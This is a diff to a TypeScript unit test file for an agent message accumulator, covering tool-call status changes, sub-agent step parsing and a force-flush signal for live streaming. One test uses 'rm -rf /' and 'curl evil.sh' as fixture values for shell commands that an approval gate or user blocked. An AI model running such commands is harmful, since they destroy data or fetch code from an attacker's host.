@@ -1,4 +1,6 @@
 /**
+ * @regression file-hitl-phase0 — pins file-edit HITL fix #3 (see _projects/2026-06/20260630.01.file-change-hitl-redesign/tasks/T01_3_regression-manifest.md)
+ *
  * Unit tests for MessageAccumulator tool call status transitions.
  *
  * Validates the indexed tool call tracking that prevents the
@@ -9,12 +11,16 @@
 
 import { describe, it, expect } from "vitest";
 import { create } from "@bufbuild/protobuf";
-import { AgentMessageSchema } from "@stigmer/protos/ai/stigmer/agentic/agentexecution/v1/message_pb";
+import {
+  AgentMessageSchema,
+  ToolCallSchema,
+} from "@stigmer/protos/ai/stigmer/agentic/agentexecution/v1/message_pb";
 import type { AgentMessage } from "@stigmer/protos/ai/stigmer/agentic/agentexecution/v1/message_pb";
 import {
   MessageType,
   ToolCallStatus,
   SubAgentStatus,
+  ToolKind,
 } from "@stigmer/protos/ai/stigmer/agentic/agentexecution/v1/enum_pb";
 import type { SDKMessage } from "@cursor/sdk";
 import {
@@ -58,6 +64,18 @@ function assistantEvent(
   };
 }
 
+function thinkingEvent(
+  runId: string,
+  text: string,
+): Extract<SDKMessage, { type: "thinking" }> {
+  return {
+    type: "thinking",
+    agent_id: "agent-1",
+    run_id: runId,
+    text,
+  };
+}
+
 function countToolCallsWithId(messages: AgentMessage[], callId: string): number {
   let count = 0;
   for (const msg of messages) {
@@ -92,6 +110,40 @@ describe("MessageAccumulator tool call status transitions", () => {
     expect(tc.status).toBe(ToolCallStatus.TOOL_CALL_COMPLETED);
     expect(tc.result).toBe("OK");
     expect(tc.completedAt).toBeTruthy();
+  });
+
+  it("persists the Cursor shell {status,value} envelope verbatim on ToolCall.result", () => {
+    // The Cursor SDK's built-in Shell tool returns a structured envelope object;
+    // the runner stores it as a JSON string (toResultString → JSON.stringify),
+    // and the SDK view layer (normalizeShell) unwraps it for display. This locks
+    // the persisted shape so the cross-language fixture (result-views.json's
+    // cursor_shell_envelope) is grounded in what the runner actually writes,
+    // not a guess — the two halves of the bug fix stay in sync.
+    const messages: AgentMessage[] = [];
+    const acc = new MessageAccumulator(messages);
+
+    const envelope = {
+      status: "success",
+      value: {
+        exitCode: 0,
+        signal: "",
+        stdout: "total 8\n",
+        stderr: "",
+        executionTime: 1176,
+      },
+    };
+
+    acc.processEvent(assistantEvent("r1", "Running ls."));
+    acc.processEvent(toolCallEvent("tc-shell", "Shell", "running"));
+    acc.processEvent(
+      toolCallEvent("tc-shell", "Shell", "completed", "run-1", { result: envelope }),
+    );
+
+    const tc = findToolCallById(messages, "tc-shell")!;
+    expect(tc.status).toBe(ToolCallStatus.TOOL_CALL_COMPLETED);
+    expect(tc.result).toBe(JSON.stringify(envelope));
+    // Round-trips to the original structure (the SDK normalizer reads .value).
+    expect(JSON.parse(tc.result)).toEqual(envelope);
   });
 
   it("cross-message completion: tool call completes after new AI message is created", () => {
@@ -237,9 +289,9 @@ describe("MessageAccumulator tool call status transitions", () => {
     expect(acc.subAgentExecutions[0].status).toBe(SubAgentStatus.SUB_AGENT_IN_PROGRESS);
   });
 
-  it("subAgentDirty starts false and is set when a sub-agent is created", () => {
+  it("isDirty starts false and is set when a sub-agent is created", () => {
     const acc = new MessageAccumulator([]);
-    expect(acc.subAgentDirty).toBe(false);
+    expect(acc.isDirty).toBe(false);
 
     acc.trackSubAgentExecution(
       toolCallEvent("tc-dirty1", "task", "running", "r1", {
@@ -247,10 +299,10 @@ describe("MessageAccumulator tool call status transitions", () => {
       }),
     );
 
-    expect(acc.subAgentDirty).toBe(true);
+    expect(acc.isDirty).toBe(true);
   });
 
-  it("markSubAgentPersisted clears the dirty flag, and an update re-marks it", () => {
+  it("markPersisted clears the dirty flag, and a sub-agent update re-marks it", () => {
     const acc = new MessageAccumulator([]);
 
     acc.trackSubAgentExecution(
@@ -258,17 +310,17 @@ describe("MessageAccumulator tool call status transitions", () => {
         args: { description: "Research", prompt: "Go" },
       }),
     );
-    expect(acc.subAgentDirty).toBe(true);
+    expect(acc.isDirty).toBe(true);
 
-    acc.markSubAgentPersisted();
-    expect(acc.subAgentDirty).toBe(false);
+    acc.markPersisted();
+    expect(acc.isDirty).toBe(false);
 
     // The completion transition (IN_PROGRESS -> COMPLETED) must re-mark dirty
     // so the terminal sub-agent state is persisted to the live stream.
     acc.trackSubAgentExecution(
       toolCallEvent("tc-dirty2", "task", "completed", "r1", { result: "Done" }),
     );
-    expect(acc.subAgentDirty).toBe(true);
+    expect(acc.isDirty).toBe(true);
     expect(acc.subAgentExecutions[0].status).toBe(SubAgentStatus.SUB_AGENT_COMPLETED);
   });
 
@@ -291,8 +343,8 @@ describe("MessageAccumulator tool call status transitions", () => {
       toolCallEvent("tc-done", "task", "completed", "r1", { result: "Found it" }),
     );
 
-    acc.markSubAgentPersisted();
-    expect(acc.subAgentDirty).toBe(false);
+    acc.markPersisted();
+    expect(acc.isDirty).toBe(false);
 
     acc.cancelInProgressSubAgents();
 
@@ -303,14 +355,14 @@ describe("MessageAccumulator tool call status transitions", () => {
     expect(running.completedAt).not.toBe("");
     expect(done.status).toBe(SubAgentStatus.SUB_AGENT_COMPLETED);
     // The transition must mark dirty so the cancellation is persisted.
-    expect(acc.subAgentDirty).toBe(true);
+    expect(acc.isDirty).toBe(true);
   });
 
   it("cancelInProgressSubAgents is a no-op when there are no running sub-agents", () => {
     const acc = new MessageAccumulator([]);
     acc.cancelInProgressSubAgents();
     expect(acc.subAgentExecutions).toHaveLength(0);
-    expect(acc.subAgentDirty).toBe(false);
+    expect(acc.isDirty).toBe(false);
   });
 
   it("sub-agent name extraction handles object subagentType", () => {
@@ -406,12 +458,18 @@ describe("MessageAccumulator tool call status transitions", () => {
     expect(sub.messages[1].content).toBe("Here is a summary of AI.");
   });
 
-  it("sub-agent extracts toolCall steps from conversationSteps", () => {
+  // Real Cursor task-result shape (verified against production agent_execution
+  // blobs): each step is a protobuf-oneof keyed DIRECTLY by kind, and a tool
+  // call is { toolCall: { toolCallId, <kind>ToolCall: { args, result } } } whose
+  // result is a oneof { success | error | permissionDenied | rejected }. This is
+  // the shape that exposed the dropped-tool-calls bug: the prior parser only
+  // matched a { type:"toolCall", message } envelope that never occurs.
+  it("sub-agent extracts real direct-keyed toolCall steps from conversationSteps", () => {
     const messages: AgentMessage[] = [];
     const acc = new MessageAccumulator(messages);
 
     const runningEvent = toolCallEvent("tc-sub7", "task", "running", "r1", {
-      args: { description: "Use tools", prompt: "Run ls" },
+      args: { description: "Explore the repo", prompt: "Find the README" },
     });
     acc.processEvent(runningEvent);
     acc.trackSubAgentExecution(runningEvent);
@@ -421,16 +479,36 @@ describe("MessageAccumulator tool call status transitions", () => {
         status: "success",
         value: {
           conversationSteps: [
+            { thinkingMessage: { text: "Let me look for the README." } },
             {
-              type: "toolCall",
-              message: {
-                type: "shell",
-                args: { command: "ls -la" },
-                result: { status: "success", value: { stdout: "file.txt", stderr: "", exitCode: 0 } },
+              toolCall: {
+                toolCallId: "glob-1",
+                globToolCall: {
+                  args: { targetDirectory: "/repo", globPattern: "**/*.md" },
+                  result: { success: { path: "/repo", files: ["README.md"] } },
+                },
               },
             },
-            { type: "assistantMessage", message: { text: "I found file.txt." } },
+            {
+              toolCall: {
+                toolCallId: "read-1",
+                readToolCall: {
+                  args: { path: "/repo/README.md" },
+                  result: {
+                    success: {
+                      content: "# Hello",
+                      path: "/repo/README.md",
+                      totalLines: 1,
+                      fileSize: 7,
+                    },
+                  },
+                },
+              },
+            },
+            { assistantMessage: { text: "I found and read the README." } },
           ],
+          agentId: "sub-agent-xyz",
+          durationMs: 4200,
           isBackground: false,
           backgroundReason: "unspecified",
         },
@@ -440,16 +518,31 @@ describe("MessageAccumulator tool call status transitions", () => {
     acc.trackSubAgentExecution(completedEvent);
 
     const sub = acc.subAgentExecutions[0];
-    expect(sub.messages).toHaveLength(2);
+    // thinking + glob tool call + read tool call + assistant text
+    expect(sub.messages).toHaveLength(4);
 
-    const toolMsg = sub.messages[0];
-    expect(toolMsg.type).toBe(MessageType.MESSAGE_AI);
-    expect(toolMsg.toolCalls).toHaveLength(1);
-    expect(toolMsg.toolCalls[0].name).toBe("shell");
-    expect(toolMsg.toolCalls[0].status).toBe(ToolCallStatus.TOOL_CALL_COMPLETED);
+    expect(sub.messages[0].type).toBe(MessageType.MESSAGE_THINKING);
+    expect(sub.messages[0].content).toBe("Let me look for the README.");
 
-    expect(sub.messages[1].type).toBe(MessageType.MESSAGE_AI);
-    expect(sub.messages[1].content).toBe("I found file.txt.");
+    const globMsg = sub.messages[1];
+    expect(globMsg.type).toBe(MessageType.MESSAGE_AI);
+    expect(globMsg.toolCalls).toHaveLength(1);
+    expect(globMsg.toolCalls[0].id).toBe("glob-1");
+    expect(globMsg.toolCalls[0].name).toBe("glob");
+    expect(globMsg.toolCalls[0].toolKind).toBe(ToolKind.SEARCH);
+    expect(globMsg.toolCalls[0].status).toBe(ToolCallStatus.TOOL_CALL_COMPLETED);
+
+    const readMsg = sub.messages[2];
+    expect(readMsg.type).toBe(MessageType.MESSAGE_AI);
+    expect(readMsg.toolCalls).toHaveLength(1);
+    expect(readMsg.toolCalls[0].id).toBe("read-1");
+    expect(readMsg.toolCalls[0].name).toBe("read");
+    expect(readMsg.toolCalls[0].toolKind).toBe(ToolKind.FILE_READ);
+    expect(readMsg.toolCalls[0].status).toBe(ToolCallStatus.TOOL_CALL_COMPLETED);
+    expect(readMsg.toolCalls[0].result).toContain("# Hello");
+
+    expect(sub.messages[3].type).toBe(MessageType.MESSAGE_AI);
+    expect(sub.messages[3].content).toBe("I found and read the README.");
   });
 
   it("sub-agent gracefully handles missing conversationSteps", () => {
@@ -551,18 +644,19 @@ describe("MessageAccumulator tool call status transitions", () => {
       expect(out[0].content).toBe("Real content.");
     });
 
-    it("extracts tool error results correctly", () => {
+    it("maps a tool result error oneof to a FAILED tool call", () => {
       const out: AgentMessage[] = [];
       extractConversationSteps({
         status: "success",
         value: {
           conversationSteps: [
             {
-              type: "toolCall",
-              message: {
-                type: "shell",
-                args: { command: "bad-cmd" },
-                result: { status: "error", error: "command not found" },
+              toolCall: {
+                toolCallId: "read-err",
+                readToolCall: {
+                  args: { path: "/nope.txt" },
+                  result: { error: { errorMessage: "file not found" } },
+                },
               },
             },
           ],
@@ -570,7 +664,70 @@ describe("MessageAccumulator tool call status transitions", () => {
       }, out);
 
       expect(out).toHaveLength(1);
-      expect(out[0].toolCalls[0].result).toBe("command not found");
+      const tc = out[0].toolCalls[0];
+      expect(tc.name).toBe("read");
+      expect(tc.status).toBe(ToolCallStatus.TOOL_CALL_FAILED);
+      expect(tc.error).toContain("file not found");
+      expect(tc.result).toBe("");
+    });
+
+    it("maps a gate-denied shell (permissionDenied / rejected) to a FAILED tool call", () => {
+      const out: AgentMessage[] = [];
+      extractConversationSteps({
+        status: "success",
+        value: {
+          conversationSteps: [
+            {
+              toolCall: {
+                toolCallId: "shell-denied",
+                shellToolCall: {
+                  args: {},
+                  result: {
+                    permissionDenied: {
+                      command: "rm -rf /",
+                      error: "blocked by approval gate",
+                      isReadonly: false,
+                    },
+                  },
+                },
+              },
+            },
+            {
+              toolCall: {
+                toolCallId: "shell-rejected",
+                shellToolCall: {
+                  args: {},
+                  result: { rejected: { command: "curl evil.sh", reason: "user rejected" } },
+                },
+              },
+            },
+          ],
+        },
+      }, out);
+
+      expect(out).toHaveLength(2);
+      expect(out[0].toolCalls[0].name).toBe("shell");
+      expect(out[0].toolCalls[0].toolKind).toBe(ToolKind.SHELL);
+      expect(out[0].toolCalls[0].status).toBe(ToolCallStatus.TOOL_CALL_FAILED);
+      expect(out[0].toolCalls[0].error).toContain("blocked by approval gate");
+      expect(out[1].toolCalls[0].status).toBe(ToolCallStatus.TOOL_CALL_FAILED);
+      expect(out[1].toolCalls[0].error).toContain("user rejected");
+    });
+
+    it("skips a malformed toolCall step with no <kind>ToolCall key", () => {
+      const out: AgentMessage[] = [];
+      extractConversationSteps({
+        status: "success",
+        value: {
+          conversationSteps: [
+            { toolCall: { toolCallId: "orphan" } },
+            { assistantMessage: { text: "still works" } },
+          ],
+        },
+      }, out);
+
+      expect(out).toHaveLength(1);
+      expect(out[0].content).toBe("still works");
     });
   });
 
@@ -710,6 +867,106 @@ describe("MessageAccumulator tool call status transitions", () => {
     });
   });
 
+  // Issue #179: the live thinking/tool-call trace was starved because the Cursor
+  // loop's persist cadence had no force-flush for tool-call lifecycle. The
+  // accumulator's isDirty signal is now the force-flush source: it MUST fire on
+  // the discrete, user-visible events (tool start, tool finish, sub-agent
+  // delegation) and MUST NOT fire on high-frequency token deltas (assistant
+  // text, model thinking), which ride the StreamingUpdateScheduler time cadence.
+  describe("streaming force-flush signal (issue #179 cadence)", () => {
+    it("flags dirty the instant a tool call is created", () => {
+      const acc = new MessageAccumulator([]);
+      acc.processEvent(assistantEvent("r1", "Let me search."));
+      expect(acc.isDirty).toBe(false); // assistant text alone does not force-flush
+
+      acc.processEvent(toolCallEvent("tc-1", "Shell", "running", "r1"));
+      expect(acc.isDirty).toBe(true);
+    });
+
+    it("flags dirty when a tool call transitions to a terminal status", () => {
+      const acc = new MessageAccumulator([]);
+      acc.processEvent(assistantEvent("r1", "Running."));
+      acc.processEvent(toolCallEvent("tc-1", "Shell", "running", "r1"));
+      acc.markPersisted();
+      expect(acc.isDirty).toBe(false);
+
+      acc.processEvent(toolCallEvent("tc-1", "Shell", "completed", "r1", { result: "OK" }));
+      expect(acc.isDirty).toBe(true);
+    });
+
+    it("does NOT re-flag dirty on a redundant terminal re-emit", () => {
+      const acc = new MessageAccumulator([]);
+      acc.processEvent(assistantEvent("r1", "Running."));
+      acc.processEvent(toolCallEvent("tc-1", "read", "running", "r1"));
+      acc.processEvent(toolCallEvent("tc-1", "read", "completed", "r1", { result: "data" }));
+      acc.markPersisted();
+      expect(acc.isDirty).toBe(false);
+
+      // An already-terminal call re-emitting is noise, not a state change.
+      acc.processEvent(toolCallEvent("tc-1", "read", "completed", "r1", { result: "" }));
+      expect(acc.isDirty).toBe(false);
+    });
+
+    it("does NOT flag dirty on model thinking deltas (they ride the scheduler cadence)", () => {
+      const acc = new MessageAccumulator([]);
+      acc.processEvent(thinkingEvent("r1", "Let me reason about this"));
+      acc.processEvent(thinkingEvent("r1", " step by step..."));
+      expect(acc.isDirty).toBe(false);
+    });
+
+    it("does NOT flag dirty on assistant text deltas", () => {
+      const acc = new MessageAccumulator([]);
+      acc.processEvent(assistantEvent("r1", "Here is "));
+      acc.processEvent(assistantEvent("r1", "the answer."));
+      expect(acc.isDirty).toBe(false);
+    });
+
+    it("suppressed todo tools do NOT flag dirty (TodoTracker owns that signal)", () => {
+      const acc = new MessageAccumulator([]);
+      acc.processEvent(assistantEvent("r1", "Planning."));
+      acc.processEvent(toolCallEvent("tc-todo", "updateTodos", "running", "r1", {
+        args: { todos: [{ content: "Step 1", status: "pending" }] },
+      }));
+      expect(acc.isDirty).toBe(false);
+    });
+
+    it("markPersisted clears a tool-call dirty flag", () => {
+      const acc = new MessageAccumulator([]);
+      acc.processEvent(assistantEvent("r1", "Running."));
+      acc.processEvent(toolCallEvent("tc-1", "Shell", "running", "r1"));
+      expect(acc.isDirty).toBe(true);
+
+      acc.markPersisted();
+      expect(acc.isDirty).toBe(false);
+    });
+
+    // The user-facing symptom: a short thinking+tool turn (< 20 stream events).
+    // The old `eventCount % 20` gate never fired, so the whole trace landed only
+    // at the final persist. With the force-flush signal, the tool lifecycle is
+    // observable mid-turn — each discrete event leaves isDirty set for the loop.
+    it("a short thinking+tool turn produces force-flush points mid-turn", () => {
+      const acc = new MessageAccumulator([]);
+      const flushPoints: string[] = [];
+      const step = (label: string, ev: SDKMessage) => {
+        acc.processEvent(ev);
+        if (acc.isDirty) {
+          flushPoints.push(label);
+          acc.markPersisted();
+        }
+      };
+
+      step("thinking", thinkingEvent("r1", "Thinking about the task..."));
+      step("assistant", assistantEvent("r1", "I'll check the file."));
+      step("tool-start", toolCallEvent("tc-1", "read", "running", "r1"));
+      step("tool-done", toolCallEvent("tc-1", "read", "completed", "r1", { result: "contents" }));
+      step("assistant-2", assistantEvent("r1", "Done."));
+
+      // Tool start and tool completion are the discrete moments the live UI must
+      // see immediately; thinking/assistant deltas are carried by the scheduler.
+      expect(flushPoints).toEqual(["tool-start", "tool-done"]);
+    });
+  });
+
   describe("cancelInProgressSubAgentProtos standalone", () => {
     it("cancels IN_PROGRESS/PENDING protos in place and reports whether anything changed", () => {
       const running = create(SubAgentExecutionSchema, {
@@ -747,4 +1004,5 @@ describe("MessageAccumulator tool call status transitions", () => {
       expect(cancelInProgressSubAgentProtos([])).toBe(false);
     });
   });
+
 });
